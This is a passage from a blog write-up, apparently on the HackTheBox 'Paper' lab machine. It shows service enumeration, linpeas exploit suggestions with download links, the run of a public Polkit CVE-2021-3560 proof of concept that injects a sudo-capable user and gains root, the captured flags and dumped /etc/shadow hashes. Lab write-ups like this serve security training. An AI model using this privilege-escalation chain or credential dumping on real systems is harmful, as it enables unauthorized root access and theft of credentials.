+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
+tcpdump:x:72:72::/:/sbin/nologin
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/sbin/nologin
+nginx:x:977:975:Nginx web server:/var/lib/nginx:/sbin/nologin
+mongod:x:976:974:mongod:/var/lib/mongo:/bin/false
+rocketchat:x:1001:1001::/home/rocketchat:/bin/bash
+dwight:x:1004:1004::/home/dwight:/bin/bash
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Enumerated local services:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre></td><td class="rouge-code"><pre><span class="o">[</span>dwight@paper Rocket.Chat]<span class="nv">$ </span>netstat <span class="nt">-polentau</span> | <span class="nb">grep</span> <span class="nt">-vE</span> <span class="s1">'WAIT|ESTABLISHED'</span>
+<span class="o">(</span>Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.<span class="o">)</span>
+Active Internet connections <span class="o">(</span>servers and established<span class="o">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name     Timer
+tcp        0      0 192.168.122.1:53        0.0.0.0:<span class="k">*</span>               LISTEN      0          37378      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN      0          30043      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+tcp        0      0 127.0.0.1:48320         0.0.0.0:<span class="k">*</span>               LISTEN      1001       40366      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+tcp        0      0 127.0.0.1:8000          0.0.0.0:<span class="k">*</span>               LISTEN      1004       42932      2403/node            off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+tcp        0      0 127.0.0.1:33060         0.0.0.0:<span class="k">*</span>               LISTEN      27         34774      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+tcp        0      0 127.0.0.1:27017         0.0.0.0:<span class="k">*</span>               LISTEN      976        32842      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+tcp        0      0 127.0.0.1:3306          0.0.0.0:<span class="k">*</span>               LISTEN      27         38979      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN      0          30054      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+tcp6       0      0 :::443                  :::<span class="k">*</span>                    LISTEN      0          33812      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+tcp6       0      0 :::80                   :::<span class="k">*</span>                    LISTEN      0          33797      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+udp        0      0 0.0.0.0:58176           0.0.0.0:<span class="k">*</span>                           70         29806      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+udp        0      0 192.168.122.1:53        0.0.0.0:<span class="k">*</span>                           0          37377      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+udp        0      0 0.0.0.0:67              0.0.0.0:<span class="k">*</span>                           0          37374      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+udp        0      0 0.0.0.0:5353            0.0.0.0:<span class="k">*</span>                           70         29804      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+udp        0      0 127.0.0.1:323           0.0.0.0:<span class="k">*</span>                           0          27599      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+udp6       0      0 :::5353                 :::<span class="k">*</span>                                70         29805      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+udp6       0      0 :::46316                :::<span class="k">*</span>                                70         29807      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+udp6       0      0 ::1:323                 :::<span class="k">*</span>                                0          27600      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Linepeas findings:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+</pre></td><td class="rouge-code"><pre>╔══════════╣ CVEs Check
+Vulnerable to CVE-2021-3560
+...
+╔══════════╣ PATH                                                                                                                                                                                                                           
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                                                                                                     
+/home/dwight/.local/bin:/home/dwight/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin                                                                                                                                                  
+New path exported: /home/dwight/.local/bin:/home/dwight/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin
+...
+╔══════════╣ Executing Linux Exploit Suggester                                                                                                                                                                                              
+╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                          
+<span class="o">[</span>+] <span class="o">[</span>CVE-2021-4034] PwnKit                                                                                                                                                                                                                  
+                                                                                                                                                                                                                                            
+   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt                                                                                                                                                                      
+   Exposure: less probable                                                                                                                                                                                                                  
+   Tags: <span class="nv">ubuntu</span><span class="o">=</span>10|11|12|13|14|15|16|17|18|19|20|21,debian<span class="o">=</span>7|8|9|10|11,fedora,manjaro                                                                                                                                                       
+   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main                                                                                                                                                                  
+                                                                                                                                                                                                                                            
+<span class="o">[</span>+] <span class="o">[</span>CVE-2021-3156] <span class="nb">sudo </span>Baron Samedit                                                                                                                                                                                                      
+                                                                                                                                                                                                                                            
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt                                                                                                                                      
+   Exposure: less probable                                                                                                                                                                                                                  
+   Tags: <span class="nv">mint</span><span class="o">=</span>19,ubuntu<span class="o">=</span>18|20, <span class="nv">debian</span><span class="o">=</span>10                                                                                                                                                                                                    
+   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main                                                                                                                                                                  
+                                                                                                                                                                                                                                            
+<span class="o">[</span>+] <span class="o">[</span>CVE-2021-3156] <span class="nb">sudo </span>Baron Samedit 2                                                                                                                                                                                                    
+                                                                                                                                                                                                                                            
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt                                                                                                                                      
+   Exposure: less probable                                                                                                                                                                                                                  
+   Tags: <span class="nv">centos</span><span class="o">=</span>6|7|8,ubuntu<span class="o">=</span>14|16|17|18|19|20, <span class="nv">debian</span><span class="o">=</span>9|10                                                                                                                                                                                 
+   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main                                                                                                                                                                 
+                                                                                                                                                                                                                                            
+<span class="o">[</span>+] <span class="o">[</span>CVE-2021-22555] Netfilter heap out-of-bounds write                                                                                                                                                                                     
+                                                                                                                                                                                                                                            
+   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html                                                                                                                                               
+   Exposure: less probable                                                                                                                                                                                                                  
+   Tags: <span class="nv">ubuntu</span><span class="o">=</span>20.04<span class="o">{</span>kernel:5.8.0-<span class="k">*</span><span class="o">}</span>                                                                                                                                                                                                       
+   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c                                                                                                                      
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c                                                                                                                                        
+   Comments: ip_tables kernel module must be loaded                                                                                                                                                                                         
+                                                                                                                                                                                                                                            
+<span class="o">[</span>+] <span class="o">[</span>CVE-2019-18634] <span class="nb">sudo </span>pwfeedback                                                                                                                                                                                                        
+                                                                                                                                                                                                                                            
+   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/                                                                                                                                                                               
+   Exposure: less probable                                                                                                                                                                                                                  
+   Tags: <span class="nv">mint</span><span class="o">=</span>19                                                                                                                                                                                                                            
+   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c                                                                                                                                                   
+   Comments: <span class="nb">sudo </span>configuration requires pwfeedback to be enabled.                                                                                                                                                                          
+
+<span class="o">[</span>+] <span class="o">[</span>CVE-2019-15666] XFRM_UAF
+
+   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
+   Exposure: less probable
+   Download URL: 
+   Comments: CONFIG_USER_NS needs to be enabled<span class="p">;</span> CONFIG_XFRM needs to be enabled
+
+<span class="o">[</span>+] <span class="o">[</span>CVE-2019-13272] PTRACE_TRACEME
+
+   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id<span class="o">=</span>1903
+   Exposure: less probable
+   Tags: <span class="nv">ubuntu</span><span class="o">=</span>16.04<span class="o">{</span>kernel:4.15.0-<span class="k">*</span><span class="o">}</span>,ubuntu<span class="o">=</span>18.04<span class="o">{</span>kernel:4.15.0-<span class="k">*</span><span class="o">}</span>,debian<span class="o">=</span>9<span class="o">{</span>kernel:4.9.0-<span class="k">*</span><span class="o">}</span>,debian<span class="o">=</span>10<span class="o">{</span>kernel:4.19.0-<span class="k">*</span><span class="o">}</span>,fedora<span class="o">=</span>30<span class="o">{</span>kernel:5.0.9-<span class="k">*</span><span class="o">}</span>
+   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
+   Comments: Requires an active PolKit agent.
+...
+</pre></td></tr></tbody></table></code></div></div>
+
+<h3 id="polkit-privilege-escalation-cve-2021-3560"><span class="me-2">Polkit Privilege Escalation (CVE-2021-3560)</span><a href="#polkit-privilege-escalation-cve-2021-3560" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p><a href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation">https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation</a></p>
+
+<p>Executed the PoC and elevated to root:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+</pre></td><td class="rouge-code"><pre><span class="o">[</span>dwight@paper shm]<span class="nv">$ </span>./poc.sh <span class="nt">-u</span><span class="o">=</span>maoutis <span class="nt">-p</span><span class="o">=</span>maoutis
+
+<span class="o">[!]</span> Username <span class="nb">set </span>as : maoutis
+<span class="o">[!]</span> No Custom Timing specified.
+<span class="o">[!]</span> Timing will be detected Automatically
+<span class="o">[!]</span> Force flag not set.
+<span class="o">[!]</span> Vulnerability checking is ENABLED!
+<span class="o">[!]</span> Starting Vulnerability Checks...
+<span class="o">[!]</span> Checking distribution...
+<span class="o">[!]</span> Detected Linux distribution as <span class="s2">"centos"</span>
+<span class="o">[!]</span> Checking <span class="k">if </span>Accountsservice and Gnome-Control-Center is installed
+<span class="o">[</span>+] Accounts service and Gnome-Control-Center Installation Found!!
+<span class="o">[!]</span> Checking <span class="k">if </span>polkit version is vulnerable
+<span class="o">[</span>+] Polkit version appears to be vulnerable!!
+<span class="o">[!]</span> Starting exploit...
+<span class="o">[!]</span> Inserting Username maoutis...
+Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
+<span class="o">[</span>+] Inserted Username maoutis  with UID 1005!
+<span class="o">[!]</span> Inserting password hash...
+<span class="o">[!]</span> It looks like the password insertion was succesful!
+<span class="o">[!]</span> Try to login as the injected user using su - maoutis
+<span class="o">[!]</span> When prompted <span class="k">for </span>password, enter your password
+<span class="o">[!]</span> If the username is inserted, but the login fails<span class="p">;</span> try running the exploit again.
+<span class="o">[!]</span> If the login was succesful,simply enter <span class="s1">'sudo bash'</span> and drop into a root shell!
+<span class="o">[</span>dwight@paper shm]<span class="nv">$ </span>su maoutis
+Password:
+<span class="o">[</span>maoutis@paper shm]<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1005<span class="o">(</span>maoutis<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1005<span class="o">(</span>maoutis<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1005<span class="o">(</span>maoutis<span class="o">)</span>,10<span class="o">(</span>wheel<span class="o">)</span>
+<span class="o">[</span>maoutis@paper shm]<span class="nv">$ </span><span class="nb">sudo </span>bash
+
+We trust you have received the usual lecture from the <span class="nb">local </span>System
+Administrator. It usually boils down to these three things:
+
+    <span class="c">#1) Respect the privacy of others.</span>
+    <span class="c">#2) Think before you type.</span>
+    <span class="c">#3) With great power comes great responsibility.</span>
+
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>maoutis:
+<span class="o">[</span>root@paper shm]## <span class="nb">id</span><span class="p">;</span> <span class="nb">hostname</span><span class="p">;</span> ip a<span class="p">;</span> <span class="nb">cat</span> /root/root.txt
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+paper
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    <span class="nb">link</span>/ether 00:50:56:b9:68:99 brd ff:ff:ff:ff:ff:ff
+    inet 10.10.11.143/23 brd 10.10.11.255 scope global noprefixroute eth0
+       valid_lft forever preferred_lft forever
+    inet6 dead:beef::250:56ff:feb9:6899/64 scope global dynamic mngtmpaddr
+       valid_lft 86398sec preferred_lft 14398sec
+    inet6 fe80::250:56ff:feb9:6899/64 scope <span class="nb">link
+       </span>valid_lft forever preferred_lft forever
+3: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default qlen 1000
+    <span class="nb">link</span>/ether 52:54:00:9b:e7:f7 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0
+       valid_lft forever preferred_lft forever
+4: virbr0-nic: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc fq_codel master virbr0 state DOWN group default qlen 1000
+    <span class="nb">link</span>/ether 52:54:00:9b:e7:f7 brd ff:ff:ff:ff:ff:ff
+c268c00c67c62ae24f54749c8469fd03
+</pre></td></tr></tbody></table></code></div></div>
+
+<p><a href="/assets/img/Paper/Untitled%2012.png" class="popup img-link shimmer"><img src="/assets/img/Paper/Untitled%2012.png" alt="Untitled" loading="lazy"></a></p>
+
+<h2 id="trophy"><span class="me-2">Trophy</span><a href="#trophy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p><a href="/assets/img/Paper/Untitled%2013.png" class="popup img-link shimmer"><img src="/assets/img/Paper/Untitled%2013.png" alt="Untitled" loading="lazy"></a></p>
+
+<p><strong>User.txt</strong></p>
+
+<p>83482a8c2adcc4a365993c3653dc9517</p>
+
+<p><strong>Root.txt</strong></p>
+
+<p>c268c00c67c62ae24f54749c8469fd03</p>
+
+<p><strong>/etc/shadow</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="o">[</span>root@paper shm]## <span class="nb">cat</span> /etc/shadow | <span class="nb">grep</span> <span class="s1">'\$'</span>
+root:<span class="nv">$6$rfCS6Tb3sgIjkTux$UhBHq5wWPncgtVnltzm3Squ9KBcX3</span>/9k0y6o8AG6lNSKOobHatUWFzPS1J8uuh/QML6kyhZ10ngXa5nCBLDkL.:18811:0:99999:7:::
+dwight:<span class="nv">$6$xVlcDig</span>.sohk9jK0<span class="nv">$BZEhwP6SZytZTTAMTqjb35j02yMHq</span>/F4jl3WPwqFCtsf0Cbce4pqo3PS8OGXiJdXGE/C4Y4yQZAmiT60wt9OQ/:18811:0:99999:7:::
+</pre></td></tr></tbody></table></code></div></div>
+
+
+  </div>
+
+  <div class="post-tail-wrapper text-muted">
+    <!-- categories -->
+    
+      <div class="post-meta mb-3">
+        <i class="far fa-folder-open fa-fw me-1"></i>
+        
+          <a href="/categories/articles-writeups/">Articles & Writeups</a>,
+          <a href="/categories/hackthebox/">HackTheBox</a>
+      </div>
+    
+
+    <!-- tags -->
+    
+      <div class="post-tags">
+        <i class="fa fa-tags fa-fw me-1"></i>
+        
+          <a
+            href="/tags/hackthebox/"
+            class="post-tag no-text-decoration"
+          >hackthebox</a>
+        
+      </div>
+    
+
+    <div
+      class="
+        post-tail-bottom
+        d-flex justify-content-between align-items-center mt-5 pb-2
+      "
+    >
+      <div class="license-wrapper">
+        
+          
+
+          This post is licensed under 
+        <a href="https://creativecommons.org/licenses/by/4.0/">
+          CC BY 4.0
+        </a>
+         by the author.
+        
+      </div>
+
+      <!-- Post sharing snippet -->
+
+<div class="share-wrapper d-flex align-items-center">
+  <span class="share-label text-muted">Share</span>
+  <span class="share-icons">
+    
+    
+    
+
+    
+
+      
+
+      <a href="https://twitter.com/intent/tweet?text=HackTheBox%20-%20Paper%20-%200xbro&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fpaper%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
+        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
+      </a>
+    
+
+      
+
+      <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox%20-%20Paper%20-%200xbro&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fpaper%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
+        <i class="fa-fw fab fa-facebook-square"></i>
+      </a>
+    
+
+      
+
+      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fpaper%2F&text=HackTheBox%20-%20Paper%20-%200xbro" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
+        <i class="fa-fw fab fa-telegram"></i>
+      </a>
+    
+
+      
+
+      <a href="https://www.linkedin.com/feed/?shareActive=true&shareUrl=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fpaper%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin">
+        <i class="fa-fw fab fa-linkedin"></i>
+      </a>
+    
+
+      
+
+      <a href="https://www.reddit.com/submit?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fpaper%2F&title=HackTheBox%20-%20Paper%20-%200xbro" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Reddit" aria-label="Reddit">
+        <i class="fa-fw fa-brands fa-square-reddit"></i>
+      </a>
+    
+
+    <button
+      id="copy-link"
+      aria-label="Copy link"
+      class="btn small"
+      data-bs-toggle="tooltip"
+      data-bs-placement="top"
+      title="Copy link"
+      data-title-succeed="Link copied successfully!"
+    >
+      <i class="fa-fw fas fa-link pe-none fs-6"></i>
+    </button>
+  </span>
+</div>
+
+    </div>
+    <!-- .post-tail-bottom -->
+  </div>
+  <!-- div.post-tail-wrapper -->
+</article>
+
+
+            
+          </main>
+
+          <!-- panel -->
+          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
+            <div class="access">
+              <!-- Get 5 last posted/updated posts -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <section id="access-lastmod">
+    <h2 class="panel-heading">Recently Updated</h2>
+    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/how-i-keep-updated/">How I keep updated in the infosec industry</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/vtenext-25-02-a-three-way-path-to-rce/">Vtenext 25.02 vulnerability research</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/wp-prevent-direct-access-CVE-2025-3861/">Incorrect Authorization to Authenticated (Contributor+) Multiple Media Actions in Prevent Direct Access Wordpress Plugin (CVE-2025-3861)</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/effective-notes-with-obsidian/">Effective Notes for OSCP, CTFs and Pentests with Obsidian (2025)</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/salesforce-hacking/">Pentesting Salesforce Communities</a>
+        </li>
+      
+    </ul>
+  </section>
+  <!-- #access-lastmod -->
+
+
+              <!-- The trending tags list -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+
+
+  <section>
+    <h2 class="panel-heading">Trending Tags</h2>
+    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/hackthebox/">hackthebox</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/deserialization/">deserialization</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/android/">android</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/php/">PHP</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/interview/">interview</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/podcast/">podcast</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/ato/">ATO</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/hacking-lab/">hacking-lab</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/note-taking/">note-taking</a>
+      
+    </div>
+  </section>
+
+
+            </div>
+
+            
+              
+              
+
+
+
+
+
+
+  <div class="toc-border-cover z-3"></div>
+  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
+    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
+    <nav id="toc"></nav>
+  </section>
+
+
+            
+          </aside>
+        </div>
+
+        <div class="row">
+          <!-- tail -->
+          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
+            
+              
+              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->
+
+<!-- The total size of related posts -->
+
+
+<!-- An random integer that bigger than 0 -->
+
+
+<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
